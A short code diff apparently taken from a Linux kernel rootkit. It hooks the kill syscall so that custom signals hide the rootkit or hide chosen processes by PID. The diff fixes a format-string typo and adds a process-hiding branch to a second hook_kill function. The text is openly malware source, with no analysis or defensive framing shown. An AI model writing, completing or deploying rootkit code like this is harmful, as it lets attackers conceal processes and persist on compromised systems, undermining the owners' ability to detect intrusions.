@@ -93,7 +93,7 @@ static asmlinkage long hook_kill(const struct pt_regs *regs){
         return 0;
     }else if((sig == SIGHIDE)){
         printk(KERN_INFO "rootkit: hiding process with id %d\n",pid);
-        sprintf(hide_pid, "%d%", pid);
+        sprintf(hide_pid, "%d", pid);
         return 0;
     }
 
@@ -268,6 +268,10 @@ static asmlinkage long hook_kill(pid_t pid, int sig){
         printk(KERN_INFO "signal: %d == SIGINVIS %d | reavling the rootkit\n", sig, SIGINVIS);
         show_me();
         hidden = 0;
+        return 0;
+    }else if((sig == SIGHIDE)){
+        printk(KERN_INFO "rootkit: hiding process with id %d\n",pid);
+        sprintf(hide_pid, "%d", pid);
         return 0;
     }
     
